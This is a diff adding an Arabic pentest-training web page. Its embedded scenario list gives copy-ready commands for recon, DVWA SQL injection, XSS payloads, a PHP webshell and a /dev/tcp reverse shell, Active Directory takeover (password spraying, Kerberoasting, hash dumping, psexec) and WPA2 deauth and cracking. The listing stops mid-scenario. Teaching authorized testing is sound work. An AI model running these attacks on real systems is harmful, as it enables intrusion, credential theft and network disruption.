@@ -1,0 +1,1402 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>خطوات التنفيذ - KaliAcademy | سيناريوهات اختبار الاختراق خطوة بخطوة</title>
+<meta name="description" content="100+ سيناريو عملي لاختبار الاختراق خطوة بخطوة. من الاستطلاع حتى إعداد التقارير. تتبع تقدمك وانسخ الأوامر مباشرة.">
+<meta name="keywords" content="خطوات اختبار الاختراق, سيناريو Pentest, تطبيقي Kali Linux, خطوات عملية بالعربي">
+<meta name="robots" content="index, follow">
+<meta property="og:title" content="خطوات التنفيذ - KaliAcademy">
+<meta property="og:description" content="سيناريوهات عملية مفصلة لاختبار الاختراق خطوة بخطوة">
+<meta property="og:image" content="images/logo.png">
+<link rel="icon" type="image/png" href="images/logo.png">
+<link rel="canonical" href="steps.html">
+<link rel="stylesheet" href="css/style.css">
+<link rel="stylesheet" href="css/enhanced.css">
+<link rel="stylesheet" href="css/cyber-theme.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.4.0/css/all.min.css">
+<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Share+Tech+Mono&family=Cairo:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+<style>
+.steps-wrapper { max-width: 1400px; margin: 0 auto; padding: 0 1.5rem 4rem; }
+.steps-hero { padding: 3rem 2rem 2.5rem; text-align: center; background: linear-gradient(180deg, rgba(0,200,255,0.06) 0%, transparent 100%); border-bottom: 1px solid var(--border); position: relative; overflow: hidden; }
+.steps-hero::before { content: ''; position: absolute; top: 0; left: 0; right: 0; height: 2px; background: linear-gradient(90deg, transparent, #0cf, #00ff41, #0cf, transparent); }
+.steps-hero h1 { font-family: 'Orbitron', sans-serif; font-size: clamp(1.5rem,4vw,2.5rem); font-weight: 900; color: #fff; margin: 0.5rem 0; }
+.steps-hero h1 span { color: #0cf; }
+.steps-hero p { color: var(--text-secondary); font-size: 0.95rem; max-width: 600px; margin: 0.8rem auto 0; line-height: 1.7; }
+.scenarios-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(340px, 1fr)); gap: 1.2rem; margin-top: 2rem; }
+.scenario-card { background: var(--bg-card); border: 1px solid var(--border); border-radius: 16px; overflow: hidden; cursor: pointer; transition: all 0.3s; }
+.scenario-card:hover { border-color: #0cf; transform: translateY(-4px); box-shadow: 0 8px 30px rgba(0,200,255,0.12); }
+.scenario-header { padding: 1.2rem; display: flex; align-items: center; gap: 1rem; }
+.scenario-icon { width: 54px; height: 54px; border-radius: 14px; background: rgba(0,200,255,0.08); border: 1px solid rgba(0,200,255,0.2); display: flex; align-items: center; justify-content: center; font-size: 1.6rem; flex-shrink: 0; }
+.scenario-info h3 { font-family: 'Cairo', sans-serif; font-size: 0.95rem; font-weight: 700; color: var(--text-primary); margin: 0 0 4px; }
+.scenario-info p { color: var(--text-muted); font-size: 0.8rem; margin: 0; line-height: 1.5; }
+.scenario-meta { display: flex; gap: 8px; flex-wrap: wrap; padding: 0 1.2rem 0.8rem; }
+.scenario-badge { padding: 3px 10px; border-radius: 20px; font-size: 0.72rem; font-weight: 600; font-family: 'Share Tech Mono', monospace; }
+.badge-easy { background: rgba(0,255,65,0.12); color: #00ff41; border: 1px solid rgba(0,255,65,0.25); }
+.badge-medium { background: rgba(255,200,0,0.12); color: #ffc800; border: 1px solid rgba(255,200,0,0.25); }
+.badge-hard { background: rgba(255,0,128,0.12); color: #ff0080; border: 1px solid rgba(255,0,128,0.25); }
+.badge-type { background: rgba(0,200,255,0.08); color: #0cf; border: 1px solid rgba(0,200,255,0.2); }
+.scenario-footer { padding: 0.7rem 1.2rem; border-top: 1px solid var(--border); display: flex; justify-content: space-between; align-items: center; background: rgba(0,0,0,0.2); }
+.scenario-time { font-size: 0.78rem; color: var(--text-muted); font-family: 'Cairo', sans-serif; }
+.scenario-open { font-size: 0.82rem; color: #0cf; }
+.steps-modal-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.93); z-index: 5000; display: flex; align-items: flex-start; justify-content: center; padding: 1rem; overflow-y: auto; backdrop-filter: blur(6px); animation: fadeIn 0.2s ease; }
+@keyframes fadeIn { from{opacity:0} to{opacity:1} }
+.steps-modal { background: var(--bg-dark); border: 1px solid rgba(0,200,255,0.3); border-radius: 18px; max-width: 860px; width: 100%; margin: auto; box-shadow: 0 0 60px rgba(0,200,255,0.1); animation: slideUp 0.3s cubic-bezier(0.16,1,0.3,1); }
+@keyframes slideUp { from{opacity:0;transform:translateY(30px)} to{opacity:1;transform:translateY(0)} }
+.steps-modal-hdr { position: sticky; top: 0; background: var(--bg-dark); z-index: 10; padding: 1.2rem 1.5rem; border-bottom: 1px solid var(--border); display: flex; align-items: center; justify-content: space-between; }
+.steps-modal-hdr h2 { font-family: 'Cairo', sans-serif; font-size: 1.1rem; color: var(--text-primary); margin: 0; }
+.steps-modal-close { width: 34px; height: 34px; border-radius: 50%; background: rgba(255,50,50,0.1); border: 1px solid rgba(255,50,50,0.3); color: #ff6666; cursor: pointer; display: flex; align-items: center; justify-content: center; font-size: 1rem; }
+.steps-modal-body { padding: 1.5rem; }
+.progress-bar-wrap { background: rgba(0,200,255,0.08); border: 1px solid rgba(0,200,255,0.2); border-radius: 10px; padding: 0.8rem 1rem; margin-bottom: 1.5rem; }
+.progress-bar-label { display: flex; justify-content: space-between; font-family: 'Cairo', sans-serif; font-size: 0.82rem; color: var(--text-muted); margin-bottom: 6px; }
+.progress-bar-track { height: 6px; background: rgba(255,255,255,0.08); border-radius: 3px; overflow: hidden; }
+.progress-bar-fill { height: 100%; background: linear-gradient(90deg, #0cf, #00ff41); border-radius: 3px; transition: width 0.5s ease; }
+.exec-step { display: flex; gap: 0; margin-bottom: 0; position: relative; }
+.exec-step:not(:last-child) .step-line { position: absolute; right: 19px; top: 44px; bottom: -8px; width: 2px; background: rgba(0,200,255,0.2); z-index: 0; }
+.step-num-col { flex-shrink: 0; width: 40px; display: flex; flex-direction: column; align-items: center; padding-top: 4px; position: relative; z-index: 1; }
+.step-circle { width: 38px; height: 38px; border-radius: 50%; background: linear-gradient(135deg, rgba(0,200,255,0.2), rgba(0,255,65,0.1)); border: 2px solid rgba(0,200,255,0.4); color: #0cf; font-weight: 900; font-size: 0.85rem; display: flex; align-items: center; justify-content: center; font-family: 'Share Tech Mono', monospace; flex-shrink: 0; }
+.step-circle.done { background: linear-gradient(135deg, #0cf, #00ff41); color: #000; border-color: #0cf; }
+.step-body { flex: 1; padding: 0 0 2rem 1rem; }
+.step-title { font-family: 'Cairo', sans-serif; font-size: 0.95rem; font-weight: 700; color: var(--text-primary); margin: 6px 0 6px; }
+.step-desc { color: var(--text-secondary); font-size: 0.84rem; line-height: 1.7; margin-bottom: 10px; }
+.step-commands { display: flex; flex-direction: column; gap: 6px; }
+.step-cmd-block { background: #060d12; border: 1px solid #1a2a1a; border-right: 3px solid #0cf; border-radius: 8px; padding: 0.7rem 1rem; display: flex; align-items: center; justify-content: space-between; gap: 0.5rem; }
+.step-cmd-block code { font-family: 'Share Tech Mono', monospace; font-size: 0.84rem; color: #0cf; white-space: pre; overflow-x: auto; flex: 1; }
+.step-cmd-block .cmd-note { color: var(--text-muted); font-size: 0.75rem; margin-top: 3px; font-family: 'Cairo', sans-serif; }
+.step-copy-btn { flex-shrink: 0; background: rgba(0,200,255,0.1); border: 1px solid rgba(0,200,255,0.2); color: #0cf; padding: 3px 8px; border-radius: 6px; cursor: pointer; font-size: 0.72rem; transition: all 0.2s; white-space: nowrap; }
+.step-copy-btn:hover { background: rgba(0,200,255,0.25); }
+.step-warning { background: rgba(255,80,0,0.07); border: 1px solid rgba(255,80,0,0.25); border-right: 3px solid #ff8800; border-radius: 8px; padding: 0.6rem 0.9rem; margin-top: 6px; color: #ffaa66; font-size: 0.8rem; font-family: 'Cairo', sans-serif; line-height: 1.6; }
+.step-tip { background: rgba(0,255,65,0.05); border: 1px solid rgba(0,255,65,0.2); border-right: 3px solid #00ff41; border-radius: 8px; padding: 0.6rem 0.9rem; margin-top: 6px; color: #88ffaa; font-size: 0.8rem; font-family: 'Cairo', sans-serif; line-height: 1.6; }
+.step-done-btn { margin-top: 8px; padding: 5px 14px; background: rgba(0,200,255,0.1); border: 1px solid rgba(0,200,255,0.3); border-radius: 8px; color: #0cf; font-family: 'Cairo', sans-serif; font-size: 0.8rem; cursor: pointer; transition: all 0.2s; }
+.step-done-btn.done { background: rgba(0,255,65,0.15); border-color: #00ff41; color: #00ff41; }
+.step-done-btn:hover { filter: brightness(1.2); }
+
+/* Filter Buttons */
+.scenario-filter-btn {
+  background: rgba(7,15,26,0.9);
+  border: 1px solid rgba(0,200,255,0.2);
+  color: rgba(212,240,255,0.6);
+  border-radius: 50px;
+  padding: 7px 18px;
+  font-size: 0.82rem;
+  font-weight: 600;
+  cursor: pointer;
+  transition: all 0.25s;
+  font-family: 'Cairo', sans-serif;
+}
+.scenario-filter-btn:hover { border-color: rgba(0, 255, 65, 0.4); color: #00ff41; background: rgba(0, 255, 65, 0.08); }
+.scenario-filter-btn.active { background: rgba(0, 255, 65, 0.15); border-color: rgba(0, 255, 65, 0.5); color: #00ff41; box-shadow: 0 0 12px rgba(0,255,65,0.15); }
+
+/* Type filter buttons */
+.type-filter-btn {
+  font-size: 0.75rem;
+  padding: 5px 12px;
+}
+.scenario-filter-btn.active { background: linear-gradient(135deg,rgba(0,200,255,0.15),rgba(0,255,65,0.08)); border-color: rgba(0,200,255,0.5); color: #0cf; box-shadow: 0 0 15px rgba(0,200,255,0.15); }
+</style>
+</head>
+<body class="grid-bg">
+<script src="js/disclaimer.js"></script>
+<script src="js/social-bar.js"></script>
+<script src="js/site-init.js"></script>
+<canvas id="matrix-canvas"></canvas>
+
+<header class="site-header">
+  <a href="index.html" class="logo">
+    <div class="logo-icon"><img src="images/logo.png" alt="Kali Academy Logo" style="width:44px;height:44px;object-fit:contain;"></div>
+    <div><span class="logo-text">KALI ACADEMY</span><span class="logo-sub">CYBER SECURITY LEARNING</span></div>
+  </a>
+  <ul class="nav-menu">
+    <li><a href="index.html" class="nav-link"><i class="fas fa-home"></i> الرئيسية</a></li>
+    <li><a href="commands.html" class="nav-link"><i class="fas fa-terminal"></i> الأوامر</a></li>
+    <li><a href="tutorials.html" class="nav-link"><i class="fas fa-book-open"></i> الدروس</a></li>
+    <li><a href="steps.html" class="nav-link active"><i class="fas fa-list-ol"></i> خطوات التنفيذ</a></li>
+    <li><a href="tools.html" class="nav-link"><i class="fas fa-tools"></i> الأدوات</a></li>
+    
+  </ul>
+  <div class="hamburger"><span></span><span></span><span></span></div>
+</header>
+<div class="mobile-menu">
+  <a href="index.html" class="nav-link mobile-nav-link"><i class="fas fa-home"></i> الرئيسية</a>
+  <a href="commands.html" class="nav-link mobile-nav-link"><i class="fas fa-terminal"></i> الأوامر</a>
+  <a href="tutorials.html" class="nav-link mobile-nav-link"><i class="fas fa-book-open"></i> الدروس</a>
+  <a href="steps.html" class="nav-link mobile-nav-link active"><i class="fas fa-list-ol"></i> خطوات التنفيذ</a>
+  <a href="tools.html" class="nav-link mobile-nav-link"><i class="fas fa-tools"></i> الأدوات</a>
+  
+</div>
+  <div class="steps-hero">
+    <div class="search-count-badge" style="margin-bottom:0.8rem;">
+      <i class="fas fa-list-ol"></i> <span id="scenarios-count">0</span> سيناريو تطبيقي
+    </div>
+    <h1>خطوات <span>التنفيذ</span></h1>
+    <p>سيناريوهات اختبار اختراق كاملة خطوة بخطوة — من الاستطلاع حتى التقرير. تتبع تقدمك وانسخ الأوامر مباشرة.</p>
+    <div style="display:flex;gap:8px;flex-wrap:wrap;justify-content:center;margin-top:1.2rem;">
+      <button class="scenario-filter-btn active" data-diff="all" onclick="filterScenarios('all',this)">🌐 الكل</button>
+      <button class="scenario-filter-btn" data-diff="easy" onclick="filterScenarios('easy',this)">🟢 سهل</button>
+      <button class="scenario-filter-btn" data-diff="medium" onclick="filterScenarios('medium',this)">🟡 متوسط</button>
+      <button class="scenario-filter-btn" data-diff="hard" onclick="filterScenarios('hard',this)">🔴 صعب</button>
+    </div>
+    <a href="tutorials.html" style="display:inline-flex;align-items:center;gap:6px;margin-top:1rem;background:rgba(0,255,65,0.08);border:1px solid rgba(0,255,65,0.2);color:#00ff41;padding:6px 16px;border-radius:8px;font-family:'Cairo',sans-serif;font-size:0.82rem;text-decoration:none;">
+      <i class="fas fa-book-open"></i> الدروس التعليمية ← لكل درس خطوات تنفيذ
+    </a>
+    
+    <!-- فلاتر النوع -->
+    <div style="display:flex;gap:6px;flex-wrap:wrap;justify-content:center;margin-top:0.8rem;">
+      <button class="scenario-filter-btn type-filter-btn active" onclick="filterByType('all',this)">📋 الكل</button>
+      <button class="scenario-filter-btn type-filter-btn" onclick="filterByType('Recon',this)">🔍 استطلاع</button>
+      <button class="scenario-filter-btn type-filter-btn" onclick="filterByType('Web App',this)">🌐 ويب</button>
+      <button class="scenario-filter-btn type-filter-btn" onclick="filterByType('Network',this)">📡 شبكات</button>
+      <button class="scenario-filter-btn type-filter-btn" onclick="filterByType('Exploitation',this)">💥 استغلال</button>
+      <button class="scenario-filter-btn type-filter-btn" onclick="filterByType('Forensics',this)">🔬 جنائي</button>
+      <button class="scenario-filter-btn type-filter-btn" onclick="filterByType('Password',this)">🔑 كلمات مرور</button>
+      <button class="scenario-filter-btn type-filter-btn" onclick="filterByType('Linux',this)">🐧 Linux</button>
+      <button class="scenario-filter-btn type-filter-btn" onclick="filterByType('CTF',this)">🏆 CTF</button>
+      <button class="scenario-filter-btn type-filter-btn" onclick="filterByType('Defense',this)">🛡️ دفاع</button>
+    </div>
+  </div>
+  <div class="scenarios-grid" id="scenariosGrid"></div>
+</div>
+
+<div class="steps-modal-overlay" id="stepsModal" style="display:none;" onclick="closeStepsModal(event)">
+  <div class="steps-modal" id="stepsModalInner">
+    <div class="steps-modal-hdr">
+      <h2 id="stepsModalTitle">عنوان السيناريو</h2>
+      <button class="steps-modal-close" onclick="closeStepsModalDirect()">✕</button>
+    </div>
+    <div class="steps-modal-body" id="stepsModalBody"></div>
+  </div>
+</div>
+
+<footer class="site-footer">
+  <div class="footer-bottom" style="max-width:1400px;margin:0 auto;text-align:center;padding:1.5rem 2rem;font-size:0.8rem;color:var(--text-muted);">
+    ⚠️ للأغراض التعليمية فقط | © 2026 Kali Academy
+  </div>
+</footer>
+
+<script src="js/matrix.js"></script>
+<script src="js/lesson-steps.js"></script>
+<script>
+// ============================================================
+// SCENARIOS DATABASE
+// ============================================================
+const SCENARIOS = [
+{
+  id: 1,
+  icon: '🔍',
+  title: 'الاستطلاع الكامل (OSINT + Scanning)',
+  desc: 'جمع أقصى قدر من المعلومات عن الهدف قبل أي هجوم — من المصادر المفتوحة حتى المسح التفصيلي.',
+  difficulty: 'easy',
+  type: 'Recon',
+  time: '45-90 دقيقة',
+  steps: [
+    {
+      title: 'البحث في WHOIS وسجلات DNS',
+      desc: 'أول خطوة: معرفة من يملك النطاق، أين مسجل، متى ينتهي، خوادم DNS. هذه المعلومات مجانية وقانونية وتكشف الكثير.',
+      commands: [
+        { cmd: 'whois targetcorp.com', note: 'معلومات تسجيل النطاق: المالك، البريد، الخوادم' },
+        { cmd: 'whois targetcorp.com | grep -i "name server"', note: 'استخراج خوادم DNS' },
+      ],
+      tip: 'البريد الإلكتروني في WHOIS غالباً بريد المسؤول — يمكن استخدامه في Spear Phishing.'
+    },
+    {
+      title: 'اكتشاف النطاقات الفرعية',
+      desc: 'النطاقات الفرعية مثل admin.target.com أو dev.target.com غالباً أقل حمايةً من الموقع الرئيسي.',
+      commands: [
+        { cmd: 'subfinder -d targetcorp.com -o subdomains.txt', note: 'اكتشاف النطاقات الفرعية' },
+        { cmd: 'cat subdomains.txt | httpx -silent', note: 'التحقق من النطاقات الحية' },
+        { cmd: 'amass enum -passive -d targetcorp.com', note: 'اكتشاف سلبي أكثر شمولاً' },
+      ],
+      tip: 'subdomains تظهر بيئات التطوير (dev, staging, test) التي غالباً تفتقر للحماية الكاملة.'
+    },
+    {
+      title: 'جمع المعلومات بـ theHarvester',
+      desc: 'theHarvester يجمع: عناوين بريد الموظفين، أسماء مضيف، IPs من Google وBing وLinkedIn.',
+      commands: [
+        { cmd: 'theHarvester -d targetcorp.com -b all -l 500', note: 'جمع من جميع المصادر' },
+        { cmd: 'theHarvester -d targetcorp.com -b google,linkedin -f report.html', note: 'جمع مع حفظ تقرير HTML' },
+      ]
+    },
+    {
+      title: 'مسح الشبكة بـ Nmap',
+      desc: 'الآن نصل للمسح التقني. ابدأ باكتشاف الأجهزة الحية، ثم مسح المنافذ، ثم اكتشاف الإصدارات.',
+      commands: [
+        { cmd: 'nmap -sn targetcorp.com/24 -oN hosts.txt', note: 'اكتشاف الأجهزة الحية' },
+        { cmd: 'nmap -sV -sC -p- --min-rate 3000 targetcorp.com -oA full_scan', note: 'مسح شامل لجميع المنافذ' },
+        { cmd: 'nmap --script=vuln targetcorp.com -oN vulns.txt', note: 'فحص الثغرات المعروفة' },
+      ],
+      warning: 'المسح قد يُسجَّل في لوغات الهدف. في اختبارات الاختراق المرخصة هذا مقبول.'
+    },
+    {
+      title: 'فحص تقنيات الموقع',
+      desc: 'معرفة تقنيات الموقع (CMS، Framework، Server) يساعد في تحديد الثغرات المحتملة.',
+      commands: [
+        { cmd: 'whatweb https://targetcorp.com', note: 'اكتشاف تقنيات الموقع' },
+        { cmd: 'wafw00f https://targetcorp.com', note: 'اكتشاف جدار الحماية (WAF)' },
+        { cmd: 'curl -I https://targetcorp.com 2>/dev/null | grep -i server', note: 'headers الخادم' },
+      ],
+      tip: 'X-Powered-By: PHP/7.2.14 يخبرك مباشرة بالإصدار — ابحث عن CVE لهذا الإصدار.'
+    },
+    {
+      title: 'البحث عن ملفات ومجلدات مخفية',
+      desc: 'المواقع غالباً تحتوي ملفات لا تُعرض للزوار: backup.zip، config.bak، .env، admin/.',
+      commands: [
+        { cmd: 'gobuster dir -u https://targetcorp.com -w /usr/share/seclists/Discovery/Web-Content/big.txt -x php,html,txt,bak,zip -t 50', note: 'فحص مجلدات وملفات مخفية' },
+        { cmd: 'gobuster dns -d targetcorp.com -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt', note: 'اكتشاف نطاقات فرعية بـ Gobuster' },
+      ]
+    },
+    {
+      title: 'تنظيم وتوثيق النتائج',
+      desc: 'دائماً نظّم نتائجك. أنشئ مجلداً للهدف وصنّف المعلومات.',
+      commands: [
+        { cmd: 'mkdir -p pentest/targetcorp/{recon,scans,exploits,evidence,reports}', note: 'هيكل مجلدات منظم' },
+        { cmd: 'nmap -sV targetcorp.com -oX scans/nmap.xml', note: 'تحويل نتائج Nmap لـ XML' },
+      ],
+      tip: 'الملاحظات المنظمة تنقذك في المراحل المتقدمة. دوّن كل شيء حتى ما يبدو غير مهم.'
+    },
+  ]
+},
+{
+  id: 2,
+  icon: '🌐',
+  title: 'اختراق تطبيق ويب ضعيف (DVWA)',
+  desc: 'سيناريو اختراق DVWA خطوة بخطوة — SQL Injection، XSS، File Upload.',
+  difficulty: 'medium',
+  type: 'Web App',
+  time: '60-120 دقيقة',
+  steps: [
+    {
+      title: 'إعداد DVWA وBurp Suite',
+      desc: 'DVWA تطبيق ويب مصمم للتدريب على الثغرات. ثبّته محلياً واضبط مستوى الصعوبة لـ Low للبداية.',
+      commands: [
+        { cmd: 'docker run -d -p 80:80 vulnerables/web-dvwa', note: 'تشغيل DVWA بـ Docker' },
+        { cmd: 'burpsuite &', note: 'تشغيل Burp Suite على 127.0.0.1:8080' },
+      ],
+      tip: 'اضبط متصفحك على Proxy: 127.0.0.1:8080 وثبّت شهادة Burp CA للـ HTTPS.'
+    },
+    {
+      title: 'SQL Injection — استخراج قاعدة البيانات',
+      desc: 'حقن SQL في حقل ID. جرّب OR 1=1-- وراقب الاستجابة. ثم استخدم SQLMap للاستخراج التلقائي.',
+      commands: [
+        { cmd: "sqlmap -u 'http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit' --cookie='PHPSESSID=YOUR_SESSION; security=low' --dbs", note: 'اكتشاف قواعد البيانات' },
+        { cmd: "sqlmap -u 'http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit' --cookie='PHPSESSID=YOUR_SESSION; security=low' -D dvwa --tables", note: 'جداول قاعدة بيانات dvwa' },
+        { cmd: "sqlmap -u 'http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit' --cookie='PHPSESSID=YOUR_SESSION; security=low' -D dvwa -T users --dump", note: 'استخراج جدول المستخدمين' },
+      ],
+      warning: 'SESSION يتغير مع كل جلسة. احصل عليه من Burp Suite أو أدوات المتصفح (F12).'
+    },
+    {
+      title: 'XSS المباشر (Reflected XSS)',
+      desc: 'في صفحة XSS في DVWA، أدخل الـ payload في حقل الاسم. إذا ظهرت رسالة تنبيه = ثغرة XSS مباشرة.',
+      commands: [
+        { cmd: '&lt;script&gt;alert("XSS")&lt;/script&gt;', note: 'أدخل هذا في حقل Name في DVWA' },
+        { cmd: '"><img src=x onerror=alert(1)>', note: 'payload بديل يتجاوز بعض الفلاتر' },
+        { cmd: 'xsser --url "http://127.0.0.1/dvwa/vulnerabilities/xss_r/?name=test" --auto', note: 'فحص XSS تلقائي بـ XSSer' },
+      ]
+    },
+    {
+      title: 'File Upload — رفع Webshell',
+      desc: 'ثغرة رفع الملفات تتيح رفع PHP shell. DVWA على مستوى Low يقبل أي ملف.',
+      commands: [
+        { cmd: 'echo "<?php system($_GET[cmd]); ?>" > shell.php', note: 'إنشاء PHP Webshell بسيط' },
+        { cmd: 'curl "http://127.0.0.1/dvwa/hackable/uploads/shell.php?cmd=whoami"', note: 'التحقق من الوصول' },
+      ],
+      tip: 'على مستوى أعلى، جرّب: shell.php.jpg أو تعديل Content-Type في Burp.'
+    },
+    {
+      title: 'الحصول على Reverse Shell كامل',
+      desc: 'من الـ Webshell، يمكن الحصول على Shell تفاعلي كامل. netcat listener يستقبل الاتصال.',
+      commands: [
+        { cmd: 'nc -lvnp 4444', note: 'في Terminal جديد: انتظار الاتصال' },
+        { cmd: 'curl "http://127.0.0.1/dvwa/hackable/uploads/shell.php?cmd=bash+-i+>%26+/dev/tcp/127.0.0.1/4444+0>%261"', note: 'Reverse Shell عبر Webshell' },
+      ],
+      warning: 'هذا على بيئة محلية فقط. لا تنفّذ هذا على أنظمة حقيقية بدون إذن.'
+    },
+  ]
+},
+{
+  id: 3,
+  icon: '🏢',
+  title: 'اختراق شبكة Windows - من المسح لـ Domain Admin',
+  desc: 'سيناريو شامل لاختبار شبكة Windows من الاستطلاع حتى السيطرة على Domain Controller.',
+  difficulty: 'hard',
+  type: 'Network',
+  time: '3-6 ساعات',
+  steps: [
+    {
+      title: 'الاستطلاع الداخلي للشبكة',
+      desc: 'بعد الوصول الأولي لجهاز في الشبكة، ابدأ بفهم بيئتك.',
+      commands: [
+        { cmd: 'ip addr show && ip route', note: 'واجهات الشبكة والمسارات' },
+        { cmd: 'nmap -sn 192.168.1.0/24 --open', note: 'الأجهزة الحية في الشبكة' },
+        { cmd: 'crackmapexec smb 192.168.1.0/24', note: 'اكتشاف أجهزة Windows وإصداراتها' },
+      ]
+    },
+    {
+      title: 'جمع معلومات Active Directory',
+      desc: 'enum4linux وldapdomaindump يستخرجان بنية AD: المستخدمون، المجموعات، السياسات.',
+      commands: [
+        { cmd: 'enum4linux -a 192.168.1.10', note: 'جمع معلومات Domain Controller' },
+        { cmd: 'crackmapexec smb 192.168.1.10 -u user -p pass --users --groups --shares', note: 'مستخدمين ومجموعات ومشاركات' },
+      ]
+    },
+    {
+      title: 'Password Spraying عبر الشبكة',
+      desc: 'Password Spray = تجربة كلمة مرور واحدة شائعة على جميع الحسابات.',
+      commands: [
+        { cmd: 'crackmapexec smb 192.168.1.0/24 -u users.txt -p "Winter2024!" --continue-on-success', note: 'Password Spray على الشبكة كاملة' },
+      ],
+      warning: 'تجاوز عدد المحاولات المسموحة يُقفل الحسابات! اعرف سياسة القفل أولاً.'
+    },
+    {
+      title: 'Kerberoasting لاختراق الحسابات الخدمية',
+      desc: 'طلب TGS لـ SPNs واستخراج هاشات الحسابات الخدمية للكسر offline.',
+      commands: [
+        { cmd: 'impacket-GetUserSPNs corp.local/user:pass -dc-ip 192.168.1.10 -outputfile kerb.hashes', note: 'استخراج هاشات Kerberoasting' },
+        { cmd: 'hashcat -m 13100 kerb.hashes /usr/share/wordlists/rockyou.txt -r rules/best64.rule', note: 'كسر هاشات Kerberos بـ GPU' },
+      ]
+    },
+    {
+      title: 'BloodHound — تحليل مسارات الهجوم',
+      desc: 'BloodHound يرسم خريطة AD ويكشف أقصر مسار للـ Domain Admin.',
+      commands: [
+        { cmd: 'bloodhound-python -d corp.local -u user -p pass -ns 192.168.1.10 -c All --zip', note: 'جمع بيانات AD كاملاً' },
+        { cmd: 'neo4j start && bloodhound &', note: 'تشغيل BloodHound' },
+      ],
+      tip: 'بعد رفع الـ ZIP في BloodHound: اضغط "Find Shortest Paths to Domain Admins".'
+    },
+    {
+      title: 'تصعيد الصلاحيات والوصول لـ Domain Admin',
+      desc: 'بعد تحليل BloodHound، نفّذ المسار المكتشف.',
+      commands: [
+        { cmd: 'crackmapexec smb DC_IP -u admin -H NTLM_HASH --sam', note: 'Pass-the-Hash للـ Domain Controller' },
+        { cmd: 'impacket-secretsdump corp.local/Administrator:pass@DC_IP', note: 'تفريغ جميع هاشات AD' },
+        { cmd: 'impacket-psexec corp.local/Administrator:pass@DC_IP', note: 'SYSTEM shell على Domain Controller' },
+      ],
+      warning: 'DCSync attack يُسجَّل في Security Event Log. في بيئات الإنتاج: دائماً بإذن ومراقبة.'
+    },
+    {
+      title: 'توثيق وإغلاق الوصول',
+      desc: 'بعد الاختبار، وثّق جميع المسارات المكتشفة وأغلق الأبواب التي دخلت منها.',
+      commands: [
+        { cmd: 'net user krbtgt /active:no', note: 'تعطيل حساب KRBTGT (إجراء بعد التدريب)' },
+        { cmd: 'impacket-secretsdump -just-dc-user krbtgt corp.local/Administrator:pass@DC_IP', note: 'التحقق من هاش KRBTGT للتوثيق' },
+      ],
+      tip: 'في الاختبار الحقيقي: اكتب تقريراً مفصلاً بكل مسار هجوم وتوصيات الإصلاح.'
+    },
+  ]
+},
+{
+  id: 4,
+  icon: '📡',
+  title: 'اختبار أمان شبكة WiFi WPA2',
+  desc: 'سيناريو اختبار أمان شبكة WiFi: من المسح حتى كسر كلمة المرور.',
+  difficulty: 'medium',
+  type: 'Wireless',
+  time: '30-60 دقيقة',
+  steps: [
+    {
+      title: 'التحضير وفحص الأجهزة',
+      desc: 'تحقق من كرت WiFi وإمكاناته. بطاقات Alfa AWUS036 الأنسب لاختبارات WiFi.',
+      commands: [
+        { cmd: 'iwconfig', note: 'عرض واجهات WiFi' },
+        { cmd: 'iw list | grep -A 10 "Supported interface modes"', note: 'التحقق من دعم Monitor Mode' },
+        { cmd: 'airmon-ng check kill', note: 'إيقاف العمليات المتعارضة (NetworkManager)' },
+      ],
+      warning: 'airmon-ng check kill يوقف اتصالك بالإنترنت. تأكد من عدم حاجتك له خلال التدريب.'
+    },
+    {
+      title: 'تفعيل Monitor Mode والمسح',
+      desc: 'Monitor Mode يحول الكرت من وضع استقبال عادي إلى وضع مراقبة يلتقط جميع الحزم.',
+      commands: [
+        { cmd: 'airmon-ng start wlan0', note: 'تفعيل Monitor Mode (wlan0 → wlan0mon)' },
+        { cmd: 'airodump-ng wlan0mon', note: 'مسح جميع الشبكات المجاورة' },
+      ],
+      tip: 'لاحظ: BSSID (MAC الراوتر)، ESSID (الاسم)، CH (القناة)، ENC (نوع التشفير). استهدف شبكاتك فقط!'
+    },
+    {
+      title: 'التقاط WPA Handshake',
+      desc: 'airodump-ng يراقب الشبكة المستهدفة. الـ Handshake يُلتقط عند اتصال عميل جديد.',
+      commands: [
+        { cmd: 'airodump-ng --bssid AA:BB:CC:DD:EE:FF -c 6 -w capture wlan0mon', note: 'مراقبة شبكة محددة (عدّل BSSID والقناة)' },
+      ]
+    },
+    {
+      title: 'إجبار العميل على إعادة الاتصال (Deauth)',
+      desc: 'في Terminal جديد، أرسل Deauth packets لطرد عميل. سيعيد الاتصال تلقائياً.',
+      commands: [
+        { cmd: 'aireplay-ng --deauth 5 -a AA:BB:CC:DD:EE:FF -c CLIENT_MAC wlan0mon', note: 'طرد عميل محدد (5 حزم)' },
+      ],
+      warning: 'Deauth تُعطّل الشبكة مؤقتاً. نفّذها فقط على شبكاتك أو بإذن صريح.'
+    },
+    {
+      title: 'كسر كلمة المرور',
+      desc: 'بعد التقاط الـ Handshake، aircrack-ng أو hashcat يجربان كلمات القاموس.',
+      commands: [
+        { cmd: 'aircrack-ng -w /usr/share/wordlists/rockyou.txt -b AA:BB:CC:DD:EE:FF capture-01.cap', note: 'كسر بـ CPU باستخدام aircrack-ng' },
+        { cmd: 'hcxpcapngtool -o hash.hc22000 capture-01.cap\nhashcat -m 22000 hash.hc22000 rockyou.txt -w 3', note: 'كسر بـ GPU (أسرع بكثير)' },
+      ],
+      tip: 'كلمات مرور أقصر من 12 حرفاً من قاموس شائع تُكسر خلال دقائق.'
+    },
+    {
+      title: 'إعادة الكرت للوضع الطبيعي',
+      desc: 'بعد الانتهاء، أعد الكرت لوضع Managed الطبيعي.',
+      commands: [
+        { cmd: 'airmon-ng stop wlan0mon\nsystemctl start NetworkManager', note: 'إيقاف Monitor Mode واستعادة الشبكة' },
